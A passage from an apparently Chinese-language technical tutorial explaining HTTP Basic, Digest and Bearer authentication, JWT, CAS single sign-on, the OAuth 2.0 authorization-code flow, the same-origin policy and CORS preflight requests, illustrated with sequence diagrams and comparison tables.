    A[&quot;Basic 认证&lt;br/&gt;RFC 7617 (2015)&quot;] --&gt;|&quot;问题：明文传密码&quot;| B[&quot;Digest 认证&lt;br/&gt;RFC 2617 (1999)&quot;]
    B --&gt;|&quot;问题：MD5 已不安全&quot;| C[&quot;Bearer Token&lt;br/&gt;RFC 6750 (2012)&quot;]

    A1[&quot;Base64 编码&lt;br/&gt;等于明文&quot;] -.-&gt; A
    B1[&quot;MD5 哈希 + Nonce&lt;br/&gt;不传明文但算法过时&quot;] -.-&gt; B
    C1[&quot;令牌持有者模式&lt;br/&gt;配合 OAuth 2.0&quot;] -.-&gt; C

    style A fill:#ffe6e6
    style B fill:#fff3e6
    style C fill:#e6ffe6</code></pre>
<h4 id="basic-认证">Basic 认证</h4>
<blockquote>
<p><strong>引入 RFC</strong>：RFC 2617 (1999)，更新于 RFC 7617 (2015)</p>
</blockquote>
<p>Basic 认证将用户名和密码用 Base64 编码后放入 <code>Authorization</code> 头。Base64 不是加密，只是编码，任何人都可以解码。</p>
<pre><code class="hljs mermaid">sequenceDiagram
    participant C as 客户端
    participant S as 服务器

    C-&gt;&gt;S: GET /protected
    S--&gt;&gt;C: 401 Unauthorized&lt;br/&gt;WWW-Authenticate: Basic realm=&quot;Secure Area&quot;
    C-&gt;&gt;C: 用户输入用户名密码
    C-&gt;&gt;C: Base64(&quot;user:pass&quot;) = &quot;dXNlcjpwYXNz&quot;
    C-&gt;&gt;S: GET /protected&lt;br/&gt;Authorization: Basic dXNlcjpwYXNz
    S-&gt;&gt;S: 解码 Base64 → &quot;user:pass&quot;&lt;br/&gt;验证用户名密码
    S--&gt;&gt;C: 200 OK + 资源</code></pre>
<p><strong>安全问题</strong>：</p>
<ul>
<li>明文传输：Base64 解码即可得到密码</li>
<li>无法防重放：同一请求可被无限次重放</li>
<li>无过期机制：认证信息长期有效</li>
</ul>
<blockquote>
<p><strong>记忆锚点：Base64 编码不是加密，等于明文传密码。</strong></p>
</blockquote>
<h4 id="digest-认证">Digest 认证</h4>
<blockquote>
<p><strong>引入 RFC</strong>：RFC 2069 (1997)，更新于 RFC 2617 (1999)</p>
</blockquote>
<p>Digest 认证通过 MD5 哈希和一次性随机数（Nonce）解决 Basic 认证的明文传输问题。客户端传输的是包含密码、Nonce、URI 等多因素的复合哈希值，而非密码本身。</p>
<pre><code class="hljs mermaid">sequenceDiagram
    participant C as 客户端
    participant S as 服务器

    C-&gt;&gt;S: GET /protected
    S-&gt;&gt;S: 生成 Nonce（一次性随机数）
    S--&gt;&gt;C: 401 Unauthorized&lt;br/&gt;WWW-Authenticate: Digest&lt;br/&gt;realm=&quot;Secure Area&quot;,&lt;br/&gt;nonce=&quot;dcd98b...&quot;,&lt;br/&gt;qop=&quot;auth&quot;

    C-&gt;&gt;C: 计算复合哈希：&lt;br/&gt;HA1 = MD5(user:realm:pass)&lt;br/&gt;HA2 = MD5(GET:/protected)&lt;br/&gt;Response = MD5(HA1:nonce:nc:cnonce:qop:HA2)
    C-&gt;&gt;S: Authorization: Digest&lt;br/&gt;username=&quot;user&quot;,&lt;br/&gt;nonce=&quot;dcd98b...&quot;,&lt;br/&gt;response=&quot;6629fa...&quot;

    S-&gt;&gt;S: 用相同算法计算 Response&lt;br/&gt;与客户端提交的 Response 比对
    S--&gt;&gt;C: 200 OK + 资源</code></pre>
<p><strong>关键参数</strong>：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nonce</code></td>
<td>服务器生成的一次性随机数，防止重放攻击</td>
</tr>
<tr>
<td><code>cnonce</code></td>
<td>客户端生成的随机数，增强安全性</td>
</tr>
<tr>
<td><code>nc</code></td>
<td>Nonce 计数器，防止同一 Nonce 被重用</td>
</tr>
<tr>
<td><code>qop</code></td>
<td>保护质量（auth / auth-int）</td>
</tr>
</tbody>
</table>
<p><strong>局限性</strong>：MD5 算法已被证明存在碰撞漏洞，现代应用不再推荐使用 Digest 认证。</p>
<blockquote>
<p><strong>记忆锚点：Digest 用复合哈希不传明文，Nonce 防重放，但 MD5 已过时。</strong></p>
</blockquote>
<h4 id="bearer-token-认证">Bearer Token 认证</h4>
<blockquote>
<p><strong>引入 RFC</strong>：RFC 6750 (2012) - OAuth 2.0 Authorization Framework: Bearer Token Usage</p>
</blockquote>
<p>Bearer Token 采用&quot;持有者即拥有者&quot;的模式——拥有令牌即可访问资源，无需额外的身份证明。这是 OAuth 2.0 框架的核心认证方式。</p>
<pre><code class="hljs mermaid">sequenceDiagram
    participant U as 用户
    participant C as 客户端
    participant A as 授权服务器
    participant R as 资源服务器

    U-&gt;&gt;C: 授权请求
    C-&gt;&gt;A: 获取 Access Token
    A--&gt;&gt;C: 返回 Bearer Token

    C-&gt;&gt;R: GET /api/resource&lt;br/&gt;Authorization: Bearer eyJhbG...
    R-&gt;&gt;R: 验证 Token 签名和有效期
    R--&gt;&gt;C: 200 OK + 资源</code></pre>
<p>Bearer Token 可以是不透明字符串（服务器端查表验证）或 JWT（自包含验证）。</p>
<blockquote>
<p><strong>记忆锚点：Bearer 持有即拥有，JWT 自包含无状态，但需防泄露。</strong></p>
</blockquote>
<h4 id="三种方案安全性对比">三种方案安全性对比</h4>
<table>
<thead>
<tr>
<th>维度</th>
<th>Basic</th>
<th>Digest</th>
<th>Bearer</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>密码传输</strong></td>
<td>明文（Base64）</td>
<td>复合哈希值</td>
<td>不传输密码</td>
</tr>
<tr>
<td><strong>防重放</strong></td>
<td>不支持</td>
<td>支持（Nonce）</td>
<td>依赖 Token 有效期</td>
</tr>
<tr>
<td><strong>防中间人</strong></td>
<td>不支持</td>
<td>支持</td>
<td>依赖 HTTPS</td>
</tr>
<tr>
<td><strong>防篡改</strong></td>
<td>不支持</td>
<td>支持</td>
<td>支持（JWT 签名）</td>
</tr>
<tr>
<td><strong>算法强度</strong></td>
<td>无</td>
<td>MD5（已过时）</td>
<td>可选强算法（RS256 等）</td>
</tr>
<tr>
<td><strong>适用场景</strong></td>
<td>内网测试</td>
<td>遗留系统</td>
<td>现代 API</td>
</tr>
</tbody>
</table>
<h4 id="历史演进时间线">历史演进时间线</h4>
<pre><code class="hljs mermaid">graph LR
    A[&quot;1997&lt;br/&gt;RFC 2069&lt;br/&gt;Digest 初版&quot;] --&gt; B[&quot;1999&lt;br/&gt;RFC 2617&lt;br/&gt;Basic + Digest&quot;]
    B --&gt; C[&quot;2012&lt;br/&gt;RFC 6750&lt;br/&gt;Bearer Token&quot;]
    C --&gt; D[&quot;2015&lt;br/&gt;RFC 7617&lt;br/&gt;Basic 更新&quot;]

    style A fill:#ffe6e6
    style B fill:#fff3e6
    style C fill:#e6ffe6
    style D fill:#e6e6ff</code></pre>
<h4 id="实践建议">实践建议</h4>
<h5 id="何时使用-basic-认证">何时使用 Basic 认证</h5>
<ul>
<li>内网环境 + HTTPS</li>
<li>快速原型开发</li>
<li>简单的 API 测试工具</li>
<li><strong>不适用</strong>：互联网公开 API、涉及敏感数据的场景</li>
</ul>
<h5 id="何时使用-digest-认证">何时使用 Digest 认证</h5>
<ul>
<li>遗留系统维护</li>
<li>无法使用 HTTPS 的特殊环境</li>
<li><strong>不适用</strong>：新项目开发（MD5 已不安全）、现代浏览器环境</li>
</ul>
<h5 id="何时使用-bearer-token">何时使用 Bearer Token</h5>
<ul>
<li>RESTful API</li>
<li>微服务架构</li>
<li>移动 App 后端</li>
<li>第三方授权（OAuth 2.0）</li>
<li><strong>注意</strong>：传统网页应用中 Cookie + Session 更简单</li>
</ul>
<h5 id="安全最佳实践">安全最佳实践</h5>
<ol>
<li><strong>始终使用 HTTPS</strong>：所有认证方案都应配合 HTTPS 使用</li>
<li><strong>设置合理有效期</strong>：Bearer Token 有效期不宜过长（建议 15-30 分钟）</li>
<li><strong>实现 Token 刷新</strong>：使用 Refresh Token 实现长期访问</li>
<li><strong>添加 IP 限制</strong>：绑定 Token 和客户端 IP 地址</li>
<li><strong>监控异常访问</strong>：记录和告警异常的 Token 使用行为</li>
</ol>
<blockquote>
<p><strong>记忆锚点：HTTPS 是基础，Token 要短命，刷新机制不可少。</strong></p>
</blockquote>
<h3 id="jwt-深入解析">JWT 深入解析</h3>
<blockquote>
<p><strong>核心问题</strong>：传统 Session 需要服务端存储状态，在微服务架构下成为瓶颈。能否将状态编码到令牌中，让服务端完全无状态？</p>
</blockquote>
<p>JWT（JSON Web Token，RFC 7519）是一种自包含的令牌格式，将用户身份和权限信息编码到 Token 中，通过数字签名保证完整性。</p>
<h4 id="jwt-结构">JWT 结构</h4>
<p>JWT 由三部分组成，用 <code>.</code> 分隔：<code>Header.Payload.Signature</code></p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.    ← Header（<span class="hljs-keyword">Base64URL </span>编码）<br>eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ik   ← Payload（<span class="hljs-keyword">Base64URL </span>编码）<br>pvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.<br>SflKxwRJSMeKKF2QT<span class="hljs-symbol">4f</span>wpMeJf36POk6yJV_adQssw5c  ← Signature<br></code></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>部分</th>
<th>内容</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Header</strong></td>
<td>算法和类型声明</td>
<td><code>{&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}</code></td>
</tr>
<tr>
<td><strong>Payload</strong></td>
<td>声明（Claims）</td>
<td><code>{&quot;sub&quot;:&quot;1234567890&quot;,&quot;name&quot;:&quot;John Doe&quot;,&quot;exp&quot;:1516239022}</code></td>
</tr>
<tr>
<td><strong>Signature</strong></td>
<td>签名</td>
<td><code>HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</code></td>
</tr>
</tbody>
</table>
<h4 id="标准声明字段-rfc-7519-4-1">标准声明字段（RFC 7519 §4.1）</h4>
<table>
<thead>
<tr>
<th>字段</th>
<th>全称</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>iss</code></td>
<td>Issuer</td>
<td>签发者</td>
</tr>
<tr>
<td><code>sub</code></td>
<td>Subject</td>
<td>主题（通常是用户 ID）</td>
</tr>
<tr>
<td><code>aud</code></td>
<td>Audience</td>
<td>接收方</td>
</tr>
<tr>
<td><code>exp</code></td>
<td>Expiration Time</td>
<td>过期时间</td>
</tr>
<tr>
<td><code>nbf</code></td>
<td>Not Before</td>
<td>生效时间</td>
</tr>
<tr>
<td><code>iat</code></td>
<td>Issued At</td>
<td>签发时间</td>
</tr>
<tr>
<td><code>jti</code></td>
<td>JWT ID</td>
<td>唯一标识符（可用于黑名单撤销）</td>
</tr>
</tbody>
</table>
<h4 id="签名算法">签名算法</h4>
<table>
<thead>
<tr>
<th>算法</th>
<th>类型</th>
<th>密钥</th>
<th>适用场景</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>HS256</strong></td>
<td>对称加密</td>
<td>共享密钥</td>
<td>单体应用（签发和验证方相同）</td>
</tr>
<tr>
<td><strong>RS256</strong></td>
<td>非对称加密</td>
<td>私钥签名 / 公钥验证</td>
<td>微服务（签发方和验证方分离）</td>
</tr>
<tr>
<td><strong>ES256</strong></td>
<td>椭圆曲线</td>
<td>私钥签名 / 公钥验证</td>
<td>高安全要求场景</td>
</tr>
</tbody>
</table>
<h4 id="jwt-的撤销难题">JWT 的撤销难题</h4>
<p>JWT 一旦签发就无法主动撤销——这是&quot;自包含&quot;设计的代价。常见的应对方案：</p>
<table>
<thead>
<tr>
<th>方案</th>
<th>原理</th>
<th>代价</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>短有效期</strong></td>
<td>Access Token 有效期设为 15-30 分钟</td>
<td>需要频繁刷新</td>
</tr>
<tr>
<td><strong>黑名单</strong></td>
<td>将需要撤销的 <code>jti</code> 存入 Redis</td>
<td>引入服务端状态，部分抵消无状态优势</td>
</tr>
<tr>
<td><strong>刷新令牌</strong></td>
<td>用长期有效的 Refresh Token 换取短期 Access Token</td>
<td>增加复杂度</td>
</tr>
</tbody>
</table>
<h4 id="jwt-刷新流程">JWT 刷新流程</h4>
<pre><code class="hljs mermaid">sequenceDiagram
    participant C as 客户端
    participant A as 授权服务器
    participant R as 资源服务器

    Note over C,A: 初始登录
    C-&gt;&gt;A: 用户名 + 密码
    A--&gt;&gt;C: Access Token（15 分钟）&lt;br/&gt;+ Refresh Token（7 天）

    Note over C,R: 正常访问
    C-&gt;&gt;R: Authorization: Bearer &#123;access_token&#125;
    R--&gt;&gt;C: 200 OK

    Note over C,R: Access Token 过期
    C-&gt;&gt;R: Authorization: Bearer &#123;expired_access_token&#125;
    R--&gt;&gt;C: 401 Token Expired

    Note over C,A: 刷新 Token
    C-&gt;&gt;A: POST /token/refresh&lt;br/&gt;Refresh Token
    A-&gt;&gt;A: 验证 Refresh Token 有效性
    A--&gt;&gt;C: 新 Access Token（15 分钟）&lt;br/&gt;+ 新 Refresh Token（7 天）

    Note over C,R: 继续访问
    C-&gt;&gt;R: Authorization: Bearer &#123;new_access_token&#125;
    R--&gt;&gt;C: 200 OK</code></pre>
<h4 id="session-vs-jwt-决策">Session vs JWT 决策</h4>
<table>
<thead>
<tr>
<th>维度</th>
<th>Session</th>
<th>JWT</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>状态存储</strong></td>
<td>服务端（内存/Redis）</td>
<td>客户端（Token 自包含）</td>
</tr>
<tr>
<td><strong>扩展性</strong></td>
<td>需要共享存储</td>
<td>天然支持水平扩展</td>
</tr>
<tr>
<td><strong>撤销能力</strong></td>
<td>直接删除 Session</td>
<td>需要黑名单机制</td>
</tr>
<tr>
<td><strong>传输开销</strong></td>
<td>Cookie 仅含 Session ID（几十字节）</td>
<td>JWT 包含完整声明（几百字节到几 KB）</td>
</tr>
<tr>
<td><strong>适用场景</strong></td>
<td>传统 Web 应用</td>
<td>微服务、API、移动端</td>
</tr>
</tbody>
</table>
<blockquote>
<p><strong>记忆锚点：JWT 签名防篡改，过期防滥用，但签出去就收不回来。</strong></p>
</blockquote>
<h3 id="sso-单点登录">SSO 单点登录</h3>
<blockquote>
<p><strong>核心问题</strong>：企业内部有多个系统（OA、邮箱、CRM），用户是否需要在每个系统都登录一次？</p>
</blockquote>
<p>SSO（Single Sign-On）的目标是：<strong>一次登录，处处通行</strong>。用户在一个系统登录后，访问其他系统时无需再次输入凭证。</p>
<h4 id="cas-协议工作流程">CAS 协议工作流程</h4>
<p>CAS（Central Authentication Service）是最经典的 SSO 协议。其核心思想是引入一个中心化的认证服务器（CAS Server），所有业务系统（CAS Client）将认证请求委托给它。</p>
<pre><code class="hljs mermaid">sequenceDiagram
    participant U as 用户浏览器
    participant A as 应用 A
    participant CAS as CAS 认证中心
    participant B as 应用 B

    Note over U,CAS: 首次访问应用 A（未登录）
    U-&gt;&gt;A: 访问 app-a.com/dashboard
    A-&gt;&gt;A: 检查 Session → 无
    A--&gt;&gt;U: 302 重定向到 CAS&lt;br/&gt;cas.com/login?service=app-a.com/callback

    U-&gt;&gt;CAS: 访问 CAS 登录页
    CAS-&gt;&gt;CAS: 检查 CAS Cookie（TGC）→ 无
    CAS--&gt;&gt;U: 返回登录表单

    U-&gt;&gt;CAS: 提交用户名 + 密码
    CAS-&gt;&gt;CAS: 验证凭证&lt;br/&gt;创建 TGT（Ticket Granting Ticket）&lt;br/&gt;生成 ST（Service Ticket）
    CAS--&gt;&gt;U: 302 重定向到 app-a.com/callback?ticket=ST-12345&lt;br/&gt;Set-Cookie: TGC=TGT-xxx（CAS 域名下）

    U-&gt;&gt;A: 访问 app-a.com/callback?ticket=ST-12345
    A-&gt;&gt;CAS: 后端验证 ST-12345（服务端到服务端）
    CAS-&gt;&gt;CAS: 验证 ST 有效性&lt;br/&gt;ST 用完即焚（一次性）
    CAS--&gt;&gt;A: 返回用户信息
    A-&gt;&gt;A: 创建本地 Session
    A--&gt;&gt;U: 200 OK + Set-Cookie: JSESSIONID=...

    Note over U,CAS: 访问应用 B（已在 CAS 登录）
    U-&gt;&gt;B: 访问 app-b.com/home
    B-&gt;&gt;B: 检查 Session → 无
    B--&gt;&gt;U: 302 重定向到 CAS&lt;br/&gt;cas.com/login?service=app-b.com/callback

    U-&gt;&gt;CAS: 访问 CAS（携带 TGC Cookie）
    CAS-&gt;&gt;CAS: 验证 TGC → 有效&lt;br/&gt;生成新的 ST
    CAS--&gt;&gt;U: 302 重定向到 app-b.com/callback?ticket=ST-67890&lt;br/&gt;（无需再次登录）

    U-&gt;&gt;B: 访问 app-b.com/callback?ticket=ST-67890
    B-&gt;&gt;CAS: 后端验证 ST-67890
    CAS--&gt;&gt;B: 返回用户信息
    B-&gt;&gt;B: 创建本地 Session
    B--&gt;&gt;U: 200 OK（免登录成功）</code></pre>
<h4 id="cas-核心概念">CAS 核心概念</h4>
<table>
<thead>
<tr>
<th>概念</th>
<th>全称</th>
<th>作用</th>
<th>生命周期</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>TGT</strong></td>
<td>Ticket Granting Ticket</td>
<td>CAS 服务端的登录凭证</td>
<td>长期有效（如 8 小时）</td>
</tr>
<tr>
<td><strong>TGC</strong></td>
<td>Ticket Granting Cookie</td>
<td>浏览器端存储的 TGT 引用</td>
<td>随 TGT 过期</td>
</tr>
<tr>
<td><strong>ST</strong></td>
<td>Service Ticket</td>
<td>一次性票据，用于业务系统验证</td>
<td>用完即焚（一次性）</td>
</tr>
</tbody>
</table>
<h4 id="sso-单点登出">SSO 单点登出</h4>
<p>单点登出是 SSO 的常见 Corner Case：用户在一个系统登出后，所有系统都应该同步登出。</p>
<pre><code class="hljs mermaid">sequenceDiagram
    participant U as 用户浏览器
    participant A as 应用 A
    participant CAS as CAS 认证中心
    participant B as 应用 B

    U-&gt;&gt;A: 点击&quot;登出&quot;
    A-&gt;&gt;A: 销毁本地 Session
    A--&gt;&gt;U: 302 重定向到 CAS&lt;br/&gt;cas.com/logout

    U-&gt;&gt;CAS: 访问 CAS 登出接口
    CAS-&gt;&gt;CAS: 销毁 TGT&lt;br/&gt;清除 TGC Cookie
    CAS-&gt;&gt;A: 回调通知：销毁 Session（后端到后端）
    CAS-&gt;&gt;B: 回调通知：销毁 Session（后端到后端）
    A-&gt;&gt;A: 销毁本地 Session
    B-&gt;&gt;B: 销毁本地 Session
    CAS--&gt;&gt;U: 重定向到登录页

    Note over U,B: 用户再访问应用 B
    U-&gt;&gt;B: 访问 app-b.com/home
    B-&gt;&gt;B: 检查 Session → 已销毁
    B--&gt;&gt;U: 302 重定向到 CAS 登录页</code></pre>
<p><strong>Corner Case</strong>：如果应用 B 的回调通知失败（网络问题），用户在应用 B 的 Session 可能不会被及时销毁。解决方案：</p>
<ul>
<li>设置较短的 Session 有效期</li>
<li>应用端定期向 CAS 校验 TGT 状态</li>
<li>使用消息队列保证通知的可靠投递</li>
</ul>
<h4 id="跨域-sso">跨域 SSO</h4>
<p>当业务系统分布在不同域名下（如 <code>a.company.com</code> 和 <code>b.partner.com</code>），Cookie 无法跨域共享。CAS 协议通过 <strong>HTTP 重定向</strong> 解决这个问题——TGC 只存在 CAS 域名下，各业务系统通过重定向到 CAS 来检查登录状态。</p>
<blockquote>
<p><strong>记忆锚点：没 Cookie 就跳转 CAS，有 TGC 就签发 ST，ST 用完即焚。</strong></p>
</blockquote>
<h3 id="oauth-2-0-授权框架">OAuth 2.0 授权框架</h3>
<blockquote>
<p><strong>核心问题</strong>：用户想让第三方应用（如&quot;用微信登录&quot;）访问自己在某平台的数据，但不想把密码告诉第三方。如何在不暴露密码的情况下安全授权？</p>
</blockquote>
<p>OAuth 2.0（RFC 6749）是一个授权框架，解决的是<strong>授权</strong>问题而非认证问题。它定义了四种授权模式，其中授权码模式（Authorization Code）是最安全、最常用的。</p>
<p><img src="oauth2-arch.png" alt="OAuth2 架构"></p>
<h4 id="四个角色">四个角色</h4>
<table>
<thead>
<tr>
<th>角色</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Resource Owner</strong></td>
<td>资源拥有者（用户）</td>
<td>微信用户</td>
</tr>
<tr>
<td><strong>Client</strong></td>
<td>第三方应用</td>
<td>某电商 App</td>
</tr>
<tr>
<td><strong>Authorization Server</strong></td>
<td>授权服务器</td>
<td>微信开放平台</td>
</tr>
<tr>
<td><strong>Resource Server</strong></td>
<td>资源服务器</td>
<td>微信用户信息 API</td>
</tr>
</tbody>
</table>
<h4 id="授权码模式-authorization-code">授权码模式（Authorization Code）</h4>
<p>授权码模式是最安全的模式，适用于有后端服务器的 Web 应用。核心设计：<strong>前端拿 Code，后端换 Token，Code 用完即焚</strong>。</p>
<pre><code class="hljs mermaid">sequenceDiagram
    participant U as 用户
    participant C as 第三方应用（前端）
    participant CS as 第三方应用（后端）
    participant A as 授权服务器

    U-&gt;&gt;C: 点击&quot;用微信登录&quot;
    C--&gt;&gt;U: 302 重定向到授权服务器&lt;br/&gt;authorize?response_type=code&lt;br/&gt;&amp;client_id=xxx&lt;br/&gt;&amp;redirect_uri=callback_url&lt;br/&gt;&amp;scope=user_info&lt;br/&gt;&amp;state=random_string

    U-&gt;&gt;A: 访问授权页面
    A-&gt;&gt;A: 验证用户身份（如已登录则跳过）
    A--&gt;&gt;U: 展示授权确认页&lt;br/&gt;&quot;是否允许 xxx 访问您的用户信息？&quot;

    U-&gt;&gt;A: 用户点击&quot;同意授权&quot;
    A-&gt;&gt;A: 生成授权码（Authorization Code）&lt;br/&gt;有效期短（通常 10 分钟）
    A--&gt;&gt;U: 302 重定向到 callback_url?code=AUTH_CODE&amp;state=random_string

    U-&gt;&gt;CS: 携带 code 访问 callback_url
    CS-&gt;&gt;A: POST /token（后端到后端，不经过浏览器）&lt;br/&gt;grant_type=authorization_code&lt;br/&gt;&amp;code=AUTH_CODE&lt;br/&gt;&amp;client_id=xxx&lt;br/&gt;&amp;client_secret=yyy&lt;br/&gt;&amp;redirect_uri=callback_url
    A-&gt;&gt;A: 验证 code（用完即焚）&lt;br/&gt;验证 client_secret
    A--&gt;&gt;CS: 返回 Access Token + Refresh Token

    CS-&gt;&gt;CS: 存储 Token
    CS--&gt;&gt;U: 登录成功</code></pre>
<p><strong>安全设计要点</strong>：</p>
<ul>
<li><strong>Authorization Code 一次性使用</strong>：Code 在换取 Token 后立即失效，防止重放</li>
<li><strong>client_secret 后端传输</strong>：密钥不经过浏览器，防止泄露</li>
<li><strong>state 参数</strong>：防止 CSRF 攻击，客户端生成随机字符串并验证回调中的 state 是否一致</li>
<li><strong>PKCE 扩展</strong>（RFC 7636）：为无法安全存储 client_secret 的公开客户端（如 SPA、移动 App）提供额外保护</li>
</ul>
<h4 id="其他授权模式">其他授权模式</h4>
<table>
<thead>
<tr>
<th>模式</th>
<th>适用场景</th>
<th>安全性</th>
<th>是否推荐</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>授权码模式</strong></td>
<td>有后端的 Web 应用</td>
<td>最高</td>
<td>首选</td>
</tr>
<tr>
<td><strong>隐式模式</strong>（Implicit）</td>
<td>纯前端 SPA（已过时）</td>
<td>低（Token 暴露在 URL 中）</td>
<td>不推荐，用 PKCE 替代</td>
</tr>
<tr>
<td><strong>密码模式</strong>（Resource Owner Password）</td>
<td>高度信任的第一方应用</td>
<td>中（需要用户密码）</td>
<td>仅限第一方</td>
</tr>
<tr>
<td><strong>客户端凭证模式</strong>（Client Credentials）</td>
<td>服务间调用（无用户参与）</td>
<td>中</td>
<td>适用于 M2M</td>
</tr>
</tbody>
</table>
<h4 id="oauth-2-0-token-刷新流程">OAuth 2.0 Token 刷新流程</h4>
<pre><code class="hljs mermaid">sequenceDiagram
    participant C as 客户端
    participant A as 授权服务器
    participant R as 资源服务器

    C-&gt;&gt;R: GET /api/data&lt;br/&gt;Authorization: Bearer &#123;access_token&#125;
    R--&gt;&gt;C: 401 Token Expired

    C-&gt;&gt;A: POST /token&lt;br/&gt;grant_type=refresh_token&lt;br/&gt;&amp;refresh_token=xxx&lt;br/&gt;&amp;client_id=yyy
    A-&gt;&gt;A: 验证 Refresh Token&lt;br/&gt;签发新 Access Token&lt;br/&gt;（可选）轮换 Refresh Token
    A--&gt;&gt;C: 新 Access Token + 新 Refresh Token

    C-&gt;&gt;R: GET /api/data&lt;br/&gt;Authorization: Bearer &#123;new_access_token&#125;
    R--&gt;&gt;C: 200 OK + 数据</code></pre>
<blockquote>
<p><strong>记忆锚点：前端拿 Code，后端换 Token，Code 用完即焚，state 防 CSRF。</strong></p>
</blockquote>
<hr>
<h2 id="part-3：安全边界-浏览器如何隔离？">Part 3：安全边界——浏览器如何隔离？</h2>
<blockquote>
<p><strong>核心问题</strong>：浏览器同时打开多个网站，如何防止恶意网站读取其他网站的数据？</p>
</blockquote>
<h3 id="同源策略与跨域">同源策略与跨域</h3>
<h4 id="同源策略-same-origin-policy">同源策略（Same-Origin Policy）</h4>
<p>同源策略是浏览器最基本的安全机制（由 Netscape Navigator 2.0 于 1995 年引入）。<strong>同源</strong>的定义是：<strong>协议 + 域名 + 端口</strong> 三者完全相同。</p>
<table>
<thead>
<tr>
<th>URL A</th>
<th>URL B</th>
<th>是否同源</th>
<th>原因</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>https://a.com/page1</code></td>
<td><code>https://a.com/page2</code></td>
<td>同源</td>
<td>协议、域名、端口均相同</td>
</tr>
<tr>
<td><code>https://a.com</code></td>
<td><code>http://a.com</code></td>
<td>不同源</td>
<td>协议不同（HTTPS vs HTTP）</td>
</tr>
<tr>
<td><code>https://a.com</code></td>
<td><code>https://b.com</code></td>
<td>不同源</td>
<td>域名不同</td>
</tr>
<tr>
<td><code>https://a.com</code></td>
<td><code>https://a.com:8080</code></td>
<td>不同源</td>
<td>端口不同（443 vs 8080）</td>
</tr>
<tr>
<td><code>https://a.com</code></td>
<td><code>https://sub.a.com</code></td>
<td>不同源</td>
<td>域名不同（子域也算不同）</td>
</tr>
</tbody>
</table>
<p>同源策略限制的行为：</p>
<ul>
<li><strong>DOM 访问</strong>：不同源的页面不能访问彼此的 DOM</li>
<li><strong>Cookie/Storage</strong>：不同源的页面不能读取彼此的 Cookie 和 LocalStorage</li>
<li><strong>AJAX 请求</strong>：不同源的 AJAX 请求会被浏览器拦截（响应被丢弃）</li>
</ul>
<blockquote>
<p><strong>记忆锚点：协议域名端口三元组，一个不同就跨域。</strong></p>
</blockquote>
<h4 id="cors-cross-origin-resource-sharing">CORS（Cross-Origin Resource Sharing）</h4>
<p>CORS（RFC 6454 定义了 Origin 概念，W3C CORS 规范定义了跨域机制）是现代浏览器解决跨域问题的标准方案。服务器通过响应头声明允许哪些源访问资源。</p>
<h5 id="简单请求-vs-预检请求">简单请求 vs 预检请求</h5>
<table>
<thead>
<tr>
<th>条件</th>
<th>简单请求</th>
<th>预检请求</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>方法</strong></td>
<td>GET / HEAD / POST</td>
<td>PUT / DELETE / PATCH 等</td>
</tr>
<tr>
<td><strong>Content-Type</strong></td>
<td>text/plain, multipart/form-data, application/x-www-form-urlencoded</td>
<td>application/json 等</td>
</tr>
<tr>
<td><strong>自定义头</strong></td>
<td>无</td>
<td>有（如 Authorization）</td>
</tr>
<tr>
<td><strong>流程</strong></td>
<td>直接发送，浏览器检查响应头</td>
<td>先发 OPTIONS 预检，通过后再发实际请求</td>
</tr>
</tbody>
</table>
<h5 id="预检请求流程">预检请求流程</h5>
<pre><code class="hljs mermaid">sequenceDiagram
    participant B as 浏览器（a.com）
    participant S as 服务器（api.b.com）

    Note over B,S: 预检请求（OPTIONS）
    B-&gt;&gt;S: OPTIONS /api/data&lt;br/&gt;Origin: https://a.com&lt;br/&gt;Access-Control-Request-Method: PUT&lt;br/&gt;Access-Control-Request-Headers: Authorization, Content-Type

    S--&gt;&gt;B: 200 OK&lt;br/&gt;Access-Control-Allow-Origin: https://a.com&lt;br/&gt;Access-Control-Allow-Methods: GET, PUT, POST&lt;br/&gt;Access-Control-Allow-Headers: Authorization, Content-Type&lt;br/&gt;Access-Control-Max-Age: 86400

    Note over B,S: 实际请求
    B-&gt;&gt;S: PUT /api/data&lt;br/&gt;Origin: https://a.com&lt;br/&gt;Authorization: Bearer xxx&lt;br/&gt;Content-Type: application/json

    S--&gt;&gt;B: 200 OK&lt;br/&gt;Access-Control-Allow-Origin: https://a.com</code></pre>
<h5 id="关键响应头">关键响应头</h5>
<table>
<thead>
<tr>
<th>响应头</th>
<th>作用</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Access-Control-Allow-Origin</code></td>
<td>允许的源</td>
<td><code>https://a.com</code> 或 <code>*</code></td>
</tr>
<tr>
<td><code>Access-Control-Allow-Methods</code></td>
<td>允许的 HTTP 方法</td>
<td><code>GET, POST, PUT</code></td>
</tr>
<tr>
<td><code>Access-Control-Allow-Headers</code></td>
<td>允许的请求头</td>
<td><code>Authorization, Content-Type</code></td>
</tr>
<tr>
<td><code>Access-Control-Allow-Credentials</code></td>
<td>是否允许携带 Cookie</td>
<td><code>true</code></td>
</tr>
<tr>
<td><code>Access-Control-Max-Age</code></td>
<td>预检结果缓存时间（秒）</td>
<td><code>86400</code></td>
</tr>
</tbody>
</table>
